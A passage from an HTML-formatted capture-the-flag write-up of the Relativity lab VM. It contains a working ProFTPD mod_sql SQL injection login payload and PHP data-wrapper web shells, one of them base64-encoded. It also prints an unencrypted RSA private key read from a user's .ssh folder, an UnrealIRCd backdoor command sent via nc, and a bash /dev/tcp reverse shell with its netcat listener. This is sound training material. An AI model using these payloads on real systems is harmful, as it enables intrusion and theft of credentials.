</span><span class='line'><span class="s1">331 Password required for &#39;</span>.
</span><span class='line'>Password:
</span><span class='line'>421 Service not available, remote server has closed connection
</span><span class='line'>Login failed.
</span><span class='line'>No control connection <span class="k">for </span><span class="nb">command</span>: Success
</span><span class='line'>ftp&gt;
</span></code></pre></td></tr></table></div></figure>


<p>As you can clearly see, the response does differ from when I initially attempted to login as anonymous. This highly suggests that one of the fields is SQL injectable. And so, it was research time. Using good &lsquo;ol trusty Google, I searched for <em>proftpd mod_sql injection vulnerability</em>. Hey presto! The very first hit describes a vulnerability <a href="http://www.securityfocus.com/bid/33722">disclosed</a> in 2009.</p>

<p>From this research, we can be pretty confident in thinking that this specific FTP server may as well be vulnerable to the exact same vulnerability, and may very well be our first entry point into the system. Sample exploits are available <a href="http://www.securityfocus.com/bid/33722/exploit">here</a>, and as such I attempted to exploit this. I copied the SQLi payload from the website <code>%') and 1=2 union select 1,1,uid,gid,homedir,shell from users; --</code> and pasted this as the username, whereafter I provided 1 as the password.</p>

<figure class='code'><figcaption><span>mod_sql SQLi attempt 2</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># ftp 192.168.56.21</span>
</span><span class='line'>Connected to 192.168.56.21.
</span><span class='line'>220 Welcome to Relativity FTP <span class="o">(</span>mod_sql<span class="o">)</span>
</span><span class='line'>Name <span class="o">(</span>192.168.56.21:root<span class="o">)</span>: %<span class="s1">&#39;) and 1=2 union select 1,1,uid,gid,homedir,shell from users; --</span>
</span><span class='line'><span class="s1">331 Password required for %&#39;</span><span class="o">)</span>.
</span><span class='line'>Password:
</span><span class='line'>421 Service not available, remote server has closed connection
</span><span class='line'>Login failed.
</span><span class='line'>No control connection <span class="k">for </span><span class="nb">command</span>: Success
</span><span class='line'>ftp&gt; bye
</span></code></pre></td></tr></table></div></figure>


<p>No dice. :| Ok, well I guess I couldn&rsquo;t have expected it to be <em>that</em> easy. This caused me to dig even deeper and research exactly what the problem is, and why this vulnerability exists. Eventually, I got hold of a vulnerable version of the software, set it up in a LAB VM, and tested the SQLi payload until it worked. I ended up with a slightly different payload to the ones available online.</p>

<figure class='code'><figcaption><span>mod_sql SQLi success</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># ftp 192.168.56.21</span>
</span><span class='line'>Connected to 192.168.56.21.
</span><span class='line'>220 Welcome to Relativity FTP <span class="o">(</span>mod_sql<span class="o">)</span>
</span><span class='line'>Name <span class="o">(</span>192.168.56.21:root<span class="o">)</span>: %<span class="s1">&#39;) and 1=2 union select 1,1,uid,gid,homedir,shell from users;#</span>
</span><span class='line'><span class="s1">331 Password required for %&#39;</span><span class="o">)</span>.
</span><span class='line'>Password:
</span><span class='line'>230 User %<span class="err">&#39;</span><span class="o">)</span> and <span class="nv">1</span><span class="o">=</span>2 union <span class="k">select </span>1,1,uid,gid,homedir,shell from users<span class="p">;</span><span class="c"># logged in.</span>
</span><span class='line'>Remote system <span class="nb">type </span>is UNIX.
</span><span class='line'>Using binary mode to transfer files.
</span><span class='line'>ftp&gt;
</span></code></pre></td></tr></table></div></figure>


<p>w00t. Notice the difference though? The SQL commenting was changed from &mdash; to #. Apparently, MySQL is pretty finicky about the fact that the &mdash; style comments should have a space afterwards. This means that a payload ending with say, <code>from users; -- NOTHING_OF_VALUE</code> would have worked too. Just putting a space after the &mdash; did not work as the software most probably does a type of <code>trim()</code> on the field, hence the need to have something after the space too. Awesome, something learnt.</p>

<h3>web based attack</h3>

<p>Now that we have FTP access to the host, we simply needed to <code>ls</code> to learn what is the next step.</p>

<figure class='code'><figcaption><span>FTP Web Directory Reveal&#8220;`</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>ftp&gt; ls
</span><span class='line'>200 PORT <span class="nb">command </span>successful
</span><span class='line'>150 Opening ASCII mode data connection <span class="k">for </span>file list
</span><span class='line'>drwxr-xr-x   3 root     root         4096 Mar  5  2013 0f756638e0737f4a0de1c53bf8937a08
</span><span class='line'>-rw-r--r--   1 root     root       235423 Mar  5  2013 artwork.jpg
</span><span class='line'>-rw-r--r--   1 root     root          130 Mar  5  2013 index.html
</span><span class='line'>226 Transfer complete.
</span><span class='line'>ftp&gt; <span class="nb">cd </span>0f756638e0737f4a0de1c53bf8937a08
</span><span class='line'>550 0f756638e0737f4a0de1c53bf8937a08: Permission denied
</span><span class='line'>ftp&gt;
</span></code></pre></td></tr></table></div></figure>


<p>A directory called &lsquo;0f756638e0737f4a0de1c53bf8937a08&rsquo; was present, however our FTP user does not have access to this. We are able to deduce that this is in the web folder based on the content of the directory we have access to. So, time to slap <a href="http://192.16.56.21/0f756638e0737f4a0de1c53bf8937a08">http://192.16.56.21/0f756638e0737f4a0de1c53bf8937a08</a> into a web browser.</p>

<h3>exploiting the web based vulnerability</h3>

<p>Browsing to the above mentioned URL revealed a PHP driven website filled with information about the Relativity artwork. While this in itself was interesting, the real interest was in the url&rsquo;s to different parts of the website. More specifically, the urls were composed as <code>index.php?page=definition.php</code>. Immediately this suggested that the file <code>index.php</code> was programmed to include other files in order to render the content. In the examples case it included definition.php.</p>

<p>My first attempts to exploit this was very successful. For this kind of potential vulnerability, I have a small PHP <a href="http://php.net/manual/en/wrappers.data.php">data stream wrapper</a> shell in my toolbox. Normally, the shell looks something like this:</p>

<figure class='code'><figcaption><span>PHP Data stream Wrapper Shell</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">?</span><span class="nb">file</span><span class="o">=</span><span class="nx">data</span><span class="o">:</span><span class="p">,</span><span class="o">&lt;?</span><span class="nx">php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">c</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="x">&amp;c=ls</span>
</span></code></pre></td></tr></table></div></figure>


<p>Sometimes however, sites tend to attempt to filter out certain PHP commands. So, in order to increase the chances of success, a base64 encoded version ends up being my favourite:</p>

<figure class='code'><figcaption><span>Base 64 Encoded Data stream Wrapper Shell</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">?</span><span class="nb">file</span><span class="o">=</span><span class="nx">data</span><span class="o">:</span><span class="p">;</span><span class="nx">base64</span><span class="p">,</span><span class="nx">PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4</span><span class="o">=&amp;</span><span class="nx">c</span><span class="o">=</span><span class="nx">dir</span>
</span></code></pre></td></tr></table></div></figure>


<p>I used this and now had shell access to the box. Remembering the basic tips of enumerate->exploit->post-exploit, I ran a few simple commands, just to get a better feel for the environment that I was facing. I was using Google Chrome. If you add &lsquo;view-source:&rsquo; to the front of a url, or right click-> view source, then you will see the output for your command shell in a much neater and easier to read layout. I ran the commands <code>id; uname -a; sestatus; pwd; ls -lah /home; cat /etc/passwd</code>:</p>

<p><img src="http://i.imgur.com/pnBHjXv.png"></p>

<p>From this we know that the server is running Fedora Core 17, with the 3.9.8-100 kernel. SELinux is disabled. There are 2 users with /home directories, of which <code>jetta</code>&rsquo;s directory is protected from me reading it at the moment. root, mauk and jetta all have valid logins shells too.</p>

<p>Taking one quick step back, I investigated the sources of the website in order to maybe find some credentials that may attach this website to a database or something similarly useful. While doing this, I noticed the index.php page was in fact doing partial input validation, which may cause some web shells not to work :)</p>

<figure class='code'><figcaption><span>Hidden site index validation</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nv">$blacklist_include</span><span class="o">=</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;php://&quot;</span><span class="p">);</span>
</span><span class='line'><span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span><span class="o">&lt;</span><span class="nb">count</span><span class="p">(</span><span class="nv">$blacklist_include</span><span class="p">);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
</span><span class='line'>         <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;page&#39;</span><span class="p">],</span><span class="nv">$blacklist_include</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span> <span class="o">!==</span> <span class="k">false</span><span class="p">){</span>
</span><span class='line'>                <span class="k">die</span><span class="p">();</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="nv">$page</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;page&#39;</span><span class="p">];</span>
</span><span class='line'><span class="k">include</span> <span class="p">(</span><span class="nv">$page</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<h3>gaining further access</h3>

<p>From here you can of course take the time to set yourself up with a very nice interactive shell using this web based remote file inclusion vulnerability. However, browsing around the file system its clear that you can browse in the user <code>mauk</code>&rsquo;s home directory. While the directory itself has nothing of real value, there are still the hidden directories to view. Usually, these include things such as the users bash_history, bashrc etc. Also, ssh key related information would typically reside inside .ssh/. In this users .ssh/ directory, he left he’s SSH private key there, with permissions set so that anyone can read it. So, using the web based remote file include shell we are able to steal this off the server with the command <code>cat /home/mauk/.ssh/id_rsa</code>, which would echo us the key.</p>

<figure class='code'><figcaption><span>User mauk&#8217;s private SSH key:</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>-----BEGIN RSA PRIVATE KEY-----
</span><span class='line'>MIIEpAIBAAKCAQEA5sm/rHHoCaTtncp7DCSIJlWnUg9eyfpJ3czIn18U1lv5ZQf0
</span><span class='line'>9yGaDxafualdpXCNMo32mVQb9XQ7c2N7sdSdAjsgSjV0YG/IZGZNRyFS58YJQRdZ
</span><span class='line'>5wRu6eKAlQVss/Lq3zwuBsT8Om/1/cKpVgB3ukPtKA97M5iSxL1VWWXg6GVoJ6f6
</span><span class='line'>zIio/DZMFCxOU9Wyl7i8ssEoBxQlmgZh9pnYYhwo7Rf3RXBJeHDpuc1g+vol2vRN
</span><span class='line'>ALXqIBlItS08MhoTaS0SK+pD98OU34M745U5Mo4TgFjYc+eD7xewyduWuS5IuFPd
</span><span class='line'>xfcHkt0cQ7he0AYHuk5ooCI4ca3B0xcSZILWqwIDAQABAoIBAHNnIMxXLQNdkGAd
</span><span class='line'>tsfMoLQikodrHif7WuJpG0zuG5pQ5XWKtAi7qbCvzHDnaudmT4SfDld/gneLhord
</span><span class='line'>jSXQPi62aCATeL0cSGVD7pKJ7E3vbgM5bQAi7F9RnqBl1QRqjN3R1uYVrFaAU85v
</span><span class='line'>f4N8umHOw5ELpLyZJ5LvZfVNB1jNIRpxINhAP+/kVslsZ93qyssljokKFMy/uOIH
</span><span class='line'>r+SV3b3Zfogvg67AJ/g08jtCjYdbr7egPP2TYPMRz5fbTWCrc5m4EBvf5h5pP/w6
</span><span class='line'>Go12YacY2lbF5wzbFUjIdNyF7RZHFDbSB0bM9aCDmXTfywlFswYdb7HyIZrstQ9W
</span><span class='line'>BzWhIYkCgYEA/tUe/rhUcEYEXkhddkXWARcX0t9YNb8apY7WyVibiSyzh33mscRG
</span><span class='line'>MLZoJJri5QMvNdYkNGr5zSGEo270Q2CzduKCbhVjXIybIbmggAc/80gZ5E8FDgJ7
</span><span class='line'>szUKJL37BxXbAAYFIZkzXvc76Ve+vZvLfKMTbQqXTgKkQpGyRHLVOz8CgYEA59ht
</span><span class='line'>YicNlz2yM26mpGqQNLGtEC1RmyZbPn03yJRTBJG5/sOlMw0RI+cMEiqyo7MKHmMZ
</span><span class='line'>+Z7VKVtk8xEQbUy6EAeeSri/Fh1xiKRtlwwQSU1q2ooPOmdHyUp+rhseoPaDAJgy
</span><span class='line'>3KJYbkQMzHVt6KhsWVTEnrz0VtxiTzRu7p2Y5ZUCgYEAt5X2RG+rdU8b6oibvI9H
</span><span class='line'>Q3XNlf+NXvsUSV2EY33QX5yyodQUFNFf98wRbv2epHoM0u45GwJOgHe7RLq0gq3x
</span><span class='line'>3J4GdSQ3dv9c64j9lf6jFbNF4/MBozwqvcpiSmILrOkT4wpzO+dQ2QOoR80M/zB0
</span><span class='line'>ApDBd/b/VhYVHFg2Y5WPBKUCgYBn47SIMgXGCtBqeZ/UtyetZRyuzg/uXQ6v/r5b
</span><span class='line'>dBOLTZ2xyouhR66xjtv63AU2k4jqOvAtyf2szZZ70N6yi5ooirFkvEpsJ39zgnLV
</span><span class='line'>J4O4xScnjIvsWNFzIp2HeQGNkUj8oDbSZTEJIBc4GzrH8Yizsud0VimLLrAi29UF
</span><span class='line'>ubsEzQKBgQDpWaD5rTcaWueiH2DwI7kbdgyf6yfpunsRNsnq0GqZ2wSaUyKt9b1j
</span><span class='line'>bj9Dp+VxrUt584v//7z9Skkde2akJbA/qiF8/oOvzaiNRAOfpLCiqoL0vJ5dIvcg
</span><span class='line'>aXwuOk5Dt0/xQWPAKHL6HYyzQjnad/VAmn6tnxko1A/S8ELiG+MUtg<span class="o">==</span>
</span><span class='line'>-----END RSA PRIVATE KEY-----
</span></code></pre></td></tr></table></div></figure>


<p>What is particularly important to note here is the fact that this private key is not password protected. Usually, password protected keys would have a line such as <code>Proc-Type: 4,ENCRYPTED</code> indicating this. This key does not. So, using this, it would be as easy as specifying a private key to use when connecting and viola. I saved the the contents of <code>id_rsa</code> to a file called <code>key</code>, and specified it to be used when connecting with the <code>-i</code> flag:</p>

<figure class='code'><figcaption><span>SSH access as mauk</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># ssh mauk@192.168.56.21 -i key</span>
</span><span class='line'><span class="o">[</span>mauk@Relativity ~<span class="o">]</span><span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>mauk<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>mauk<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>mauk<span class="o">)</span>
</span><span class='line'><span class="o">[</span>mauk@Relativity ~<span class="o">]</span><span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>w00t. Now, we have a proper interactive shell as the user <code>mauk</code>! :)</p>

<h3>enumerating the next step</h3>

<p>Again, enumerate->exploit->post-exploit are very important steps. Now we find ourselves at the post-exploitation part again. Learn as much as you can about everything you can. Having the interactive SSH session that we have now, it was a breeze to learn quite a lot about the server. More importantly, learning about that which we also don’t have access to.</p>

<p>Enumeration is not just about files and the access. It also includes network interfaces, configuration etc. In the user <code>mauk</code>&rsquo;s case, he had a .bash_history file, which revealed the key to the next part of the challenge. I also noticed port 6667 (irc) being open locally along with a ircd running as the user jetta.</p>

<figure class='code'><figcaption><span>Mauks bash_history</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">[</span>mauk@Relativity ~<span class="o">]</span><span class="nv">$ </span>cat .bash_history
</span><span class='line'>
</span><span class='line'>ssh -f root@192.168.144.228 -R 6667:127.0.0.1:6667 -N
</span><span class='line'>su -
</span><span class='line'><span class="nb">exit</span>
</span><span class='line'>su -
</span><span class='line'><span class="o">[</span>mauk@Relativity ~<span class="o">]</span><span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>The bash_history confirmed the use of the ircd, and as such, I re-setup my ssh connection to the server, this time forwarding port 6667 to my laptop so that I may connect to it with a local irc client. The ssh command now looked something like this: <code>ssh -L 6667:127.0.0.1:6667 mauk@192.168.56.21 -i key</code></p>

<h3>good &lsquo;ol irc</h3>

<p>With the now forwarded IRC port, my local client connected to the irc service, and the following MOTD was sent:</p>

<figure class='code'><figcaption><span>Relativity IRC</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Connecting…
</span><span class='line'>Connected
</span><span class='line'>*** Looking up your hostname...
</span><span class='line'>*** Couldn<span class="err">&#39;</span>t resolve your hostname<span class="p">;</span> using your IP address instead
</span><span class='line'>Logged in
</span><span class='line'>Welcome to the Relativity IRC Network bobsmith!bobsmith@localhost
</span><span class='line'>Your host is relativity.localdomain, running version Unreal3.2.8.1
</span><span class='line'>This server was created Thu Feb 28 2013 at 17:54:35 EST
</span><span class='line'>relativity.localdomain Unreal3.2.8.1 iowghraAsORTVSxNCWqBzvdHtGp lvhopsmntikrRcaqOALQbSeIKVfMCuzNTGj
</span><span class='line'>UHNAMES NAMESX SAFELIST HCN <span class="nv">MAXCHANNELS</span><span class="o">=</span>10 <span class="nv">CHANLIMIT</span><span class="o">=</span><span class="c">#:10 MAXLIST=b:60,e:60,I:60 NICKLEN=30 CHANNELLEN=32 TOPICLEN=307 KICKLEN=307 AWAYLEN=307 MAXTARGETS=20 are supported by this server</span>
</span><span class='line'>WALLCHOPS <span class="nv">WATCH</span><span class="o">=</span>128 <span class="nv">WATCHOPTS</span><span class="o">=</span>A <span class="nv">SILENCE</span><span class="o">=</span>15 <span class="nv">MODES</span><span class="o">=</span>12 <span class="nv">CHANTYPES</span><span class="o">=</span><span class="c"># PREFIX=(qaohv)~&amp;@%+ CHANMODES=beI,kfL,lj,psmntirRcOAQKVCuzNSMTG NETWORK=Relativity CASEMAPPING=ascii EXTBAN=~,cqnr ELIST=MNUCT STATUSMSG=~&amp;@%+ are supported by this server</span>
</span><span class='line'>EXCEPTS INVEX <span class="nv">CMDS</span><span class="o">=</span>KNOCK,MAP,DCCALLOW,USERIP are supported by this server
</span><span class='line'>There are 1 users and 0 invisible on 1 servers
</span><span class='line'>I have 1 clients and 0 servers
</span><span class='line'>Current Local Users: 1  Max: 1
</span><span class='line'>Current Global Users: 1  Max: 1
</span><span class='line'>- relativity.localdomain Message of the Day -
</span><span class='line'>- 9/7/2013 9:17
</span><span class='line'>-     __________       .__          __  .__      .__  __
</span><span class='line'>-     <span class="se">\_</span>_____   <span class="se">\ </span>____ <span class="p">|</span>  <span class="p">|</span> _____ _/  <span class="p">|</span>_<span class="p">|</span>__<span class="p">|</span>__  _<span class="p">|</span>__<span class="p">|</span>/  <span class="p">|</span>_ ___.__.
</span><span class='line'>-      <span class="p">|</span>       _// __ <span class="se">\|</span>  <span class="p">|</span> <span class="se">\_</span>_  <span class="se">\\</span>   __<span class="se">\ </span> <span class="se">\ </span> <span class="se">\/</span> /  <span class="se">\ </span>  __&lt;   <span class="p">|</span>  <span class="p">|</span>
</span><span class='line'>-      <span class="p">|</span>    <span class="p">|</span>   <span class="se">\ </span> ___/<span class="p">|</span>  <span class="p">|</span>__/ __ <span class="se">\|</span>  <span class="p">|</span> <span class="p">|</span>  <span class="p">|</span><span class="se">\ </span>  /<span class="p">|</span>  <span class="o">||</span>  <span class="p">|</span>  <span class="se">\_</span>__  <span class="p">|</span>
</span><span class='line'>-      <span class="p">|</span>____<span class="p">|</span>_  /<span class="se">\_</span>__  &gt;____<span class="o">(</span>____  /__<span class="p">|</span> <span class="p">|</span>__<span class="p">|</span> <span class="se">\_</span>/ <span class="p">|</span>__<span class="o">||</span>__<span class="p">|</span>  / ____<span class="p">|</span> ·VM·
</span><span class='line'>-             <span class="se">\/</span>     <span class="se">\/</span>          <span class="se">\/</span>                        <span class="se">\/</span>
</span><span class='line'>End of /MOTD command.
</span></code></pre></td></tr></table></div></figure>


<p>Toying around with the IRC service did not yeald much results. No useful channels or anything funny was found with the service. However, the actual server that was running was <a href="http://www.unrealircd.com/">UnrealIRCD</a> v 3.8.2.1 as can be seen in the servers MOTD. Again, using this amazing tool called Google, I checked whats up with this version of UnrealIRCD. Lo and behold the first hit &lsquo;UnrealIRCD 3.2.8.1 Backdoor Command Execution &ndash; Rapid7&rsquo;. Excellent. Seems like this version has a remote command execution backdoor. The hit on Google to Rapid7&rsquo;s actually links to a Metasploit module for this exact same backdoor.</p>

<p>It was time to research the vulnerability a bit, just to understand what exactly is going on here. A great resource was found <a href="http://blog.stalkr.net/2010/06/unrealircd-3281-backdoored.html">here</a>, where it was explained that a piece of code exists <code>#define DEBUG3_DOLOG_SYSTEM(x) system(x)</code>, that does a system command if it sees traffic prepended with <code>AB;</code>. Alright. I didn’t have metasploit immediately available, so I opted for the <code>nc</code> shell, just to test it out. To my disappointment, it seemed like I missed something very important here as I received no output when issuing commands.</p>

<p>So back to the drawing board it was. I decided to download and compile my own local version of the backdoored ircd daemon, and test what the expected result of this backdoor should be. At the same time I also learnt a little about unrealircd itself and how to configure it. win :)</p>

<p>Eventually I got the daemon running and was able to test the backdoor locally. Still, no command output was received when commands were issued, however, I did notice that the commands themselves actually <strong>do</strong> execute. I echoed &lsquo;a&rsquo; to a file in /tmp/ via the backdoor, and in a SSH session confirmed that it now existed.</p>

<p>So, back on the challenge vm, I have port 6667 still forwarded locally. To test this, I ran a command to list the contents of /home/ and redirect the output to a file in /tmp.</p>

<figure class='code'><figcaption><span>Testing UnrealIRCD backdoor</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># echo &quot;AB; ls -lah /home/ &gt; /tmp/1&quot; | nc 127.0.0.1 6667</span>
</span><span class='line'>:relativity.localdomain NOTICE AUTH :*** Looking up your hostname...
</span><span class='line'>:relativity.localdomain NOTICE AUTH :*** Couldn<span class="err">&#39;</span>t resolve your hostname<span class="p">;</span> using your IP address instead
</span><span class='line'>:relativity.localdomain 451 AB<span class="p">;</span> :You have not registered
</span><span class='line'>^C
</span></code></pre></td></tr></table></div></figure>


<p>Back on the SSH session I had with <code>mauk</code>&rsquo;s account, /tmp/1 appeared, however without permissions for me to see it. So, I reran the previous command, substituting the backdoor command to <code>chmod 777 /tmp/1</code>. I reran the cat on /tmp/1 in mauk&rsquo;s session and bam:</p>

<figure class='code'><figcaption><span>UnrealIRCD backdoor testing</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>mauk@Relativity ~<span class="o">]</span><span class="nv">$ </span>cat /tmp/1
</span><span class='line'>total 16K
</span><span class='line'>drwxr-xr-x.  4 root  root  4.0K Feb 25  2013 .
</span><span class='line'>dr-xr-xr-x. 18 root  root  4.0K Feb 28  2013 ..
</span><span class='line'>drwx------.  4 jetta jetta 4.0K Sep 28 10:03 jetta
</span><span class='line'>drwxr-xr-x.  3 mauk  mauk  4.0K Jul  9 08:55 mauk
</span></code></pre></td></tr></table></div></figure>


<p>Oh yes! Its working! In a broken kind of way, but it works! To make my life a little easier, I changed the backdoor command to actually give me a back connect bash shell so that I can have a interactive session. Its a time saving thing really. My command to the IRCd was now <code>echo "AB; bash -i &gt;&amp; /dev/tcp/&lt;my machine&gt;/6676 0&gt;&amp;1" | nc 127.0.0.1 6667</code>. On my machine I opened a netcat listener on port 6676 and waited for the session to spawn:</p>

<figure class='code'><figcaption><span>Back connect shell for jetta</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># nc -vnlp 6676</span>
</span><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> 6676 ...
</span><span class='line'>connect to <span class="o">[</span>&lt;snip&gt;<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.56.21<span class="o">]</span> 53493
</span><span class='line'>bash: no job control in this shell
</span><span class='line'><span class="o">[</span>jetta@Relativity Unreal<span class="o">]</span><span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>Great. Now it will be a lot easier to navigate around. Spawing the shell the way I did started me off in <code>/opt/Unreal</code>, which was a directory I previously did not have access to. I poked around here for a bit, trying to see if I missed anything with regards to the IRC setup. Nothing was immediately apparent, so, I moved on to the rest of the machine. More specifically, in <code>jetta</code>&rsquo;s home directory, there was a binary called <code>auth_server</code>, owned by root, but with no suid bit. I attempted to execute the binary, and was greeted by a spinning pipe, and eventually a &lsquo;error(12)&rsquo; after a classic cowsay.</p>

<figure class='code'><figcaption><span>auth_server Test run</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">[</span>jetta@Relativity ~<span class="o">]</span><span class="nv">$ </span>ls -lah auth_server/auth_server
</span><span class='line'>ls -lah auth_server/auth_server
</span><span class='line'>-rwxr-xr-x 1 root root 7.9K Mar  8  2013 auth_server/auth_server
</span><span class='line'><span class="o">[</span>jetta@Relativity ~<span class="o">]</span><span class="nv">$ </span>auth_server/auth_server
</span><span class='line'>auth_server/auth_server
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Checking Certificates...done
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Contacting server, please wait...- ____________________________
</span><span class='line'>/ Windows 2000 is out!       <span class="se">\</span>
</span><span class='line'><span class="p">|</span>                            <span class="p">|</span>
</span><span class='line'><span class="se">\ </span>-- PC Magazine, April 2013 /
</span><span class='line'> ----------------------------
</span><span class='line'>        <span class="se">\ </span>  ^__^
</span><span class='line'>         <span class="se">\ </span> <span class="o">(</span>oo<span class="o">)</span><span class="se">\_</span>______
</span><span class='line'>            <span class="o">(</span>__<span class="o">)</span><span class="se">\ </span>      <span class="o">)</span><span class="se">\/\</span>
</span><span class='line'>                <span class="o">||</span>----w <span class="p">|</span>
</span><span class='line'>                <span class="o">||</span>     <span class="o">||</span>
</span><span class='line'>could not establish connection
</span><span class='line'>error: <span class="o">(</span>12<span class="o">)</span>
